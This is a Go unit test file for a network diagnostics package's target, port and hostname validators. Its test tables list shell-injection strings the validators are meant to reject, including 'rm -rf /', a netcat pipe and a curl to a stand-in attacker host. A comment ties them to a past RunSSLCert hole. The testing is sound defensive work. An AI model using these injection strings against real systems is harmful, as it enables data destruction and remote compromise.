package netdiag

import (
	"strings"
	"testing"
)

func TestValidateTarget(t *testing.T) {
	tests := []struct {
		name    string
		target  string
		wantErr bool
	}{
		{"IPv4", "192.168.1.1", false},
		{"IPv6", "2001:db8::1", false},
		{"IPv6 loopback", "::1", false},
		{"simple hostname", "localhost", false},
		{"FQDN", "example.com", false},
		{"FQDN with subdomain", "api.staging.example.com", false},
		{"FQDN with trailing dot", "example.com.", false},
		{"hostname with hyphen", "my-server-01.example.com", false},
		{"hostname with digits", "srv1.example.com", false},

		{"empty", "", true},
		{"whitespace only", "   ", true},
		{"label starting with hyphen", "-bad.example.com", true},
		{"label ending with hyphen", "bad-.example.com", true},
		{"empty label", "example..com", true},
		{"underscore", "my_server.example.com", true},
		{"too long", strings.Repeat("a", 254), true},
		{"label too long", strings.Repeat("a", 64) + ".com", true},

		// These are the cases that made RunSSLCert exploitable before the target
		// was passed to the shell as a positional argument.
		{"semicolon injection", "example.com; rm -rf /", true},
		{"pipe injection", "example.com | nc attacker 1234", true},
		{"command substitution", "example.com$(whoami)", true},
		{"backtick substitution", "example.com`id`", true},
		{"ampersand chaining", "example.com && curl attacker.sh", true},
		{"newline injection", "example.com\nwhoami", true},
		{"quote escape", `example.com" ; sh -c "id`, true},
		{"redirect", "example.com > /tmp/pwned", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateTarget(strings.TrimSpace(tt.target))
			if (err != nil) != tt.wantErr {
				t.Errorf("validateTarget(%q) error = %v, wantErr %v", tt.target, err, tt.wantErr)
			}
		})
	}
}

func TestValidatePort(t *testing.T) {
	tests := []struct {
		name    string
		port    string
		wantErr bool
	}{
		{"https", "443", false},
		{"http", "80", false},
		{"lowest valid", "1", false},
		{"highest valid", "65535", false},

		{"empty", "", true},
		{"zero", "0", true},
		{"above range", "65536", true},
		{"negative", "-1", true},
		{"not a number", "http", true},
		{"trailing text", "443abc", true},
		{"injection", "443; rm -rf /", true},
		{"command substitution", "443$(id)", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validatePort(tt.port)
			if (err != nil) != tt.wantErr {
				t.Errorf("validatePort(%q) error = %v, wantErr %v", tt.port, err, tt.wantErr)
			}
		})
	}
}

func TestIsHostname(t *testing.T) {
	tests := []struct {
		name string
		host string
		want bool
	}{
		{"single label", "localhost", true},
		{"two labels", "example.com", true},
		{"max label length", strings.Repeat("a", 63) + ".com", true},
		{"empty", "", false},
		{"only dot", ".", false},
		{"space", "exa mple.com", false},
		{"slash", "example.com/path", false},
		{"colon", "example.com:443", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isHostname(tt.host); got != tt.want {
				t.Errorf("isHostname(%q) = %v, want %v", tt.host, got, tt.want)
			}
		})
	}
}

func TestCapitalize(t *testing.T) {
	tests := []struct {
		in   string
		want string
	}{
		{"", ""},
		{"target is required", "Target is required"},
		{"Already capital", "Already capital"},
		{"a", "A"},
	}

	for _, tt := range tests {
		t.Run(tt.in, func(t *testing.T) {
			if got := capitalize(tt.in); got != tt.want {
				t.Errorf("capitalize(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}
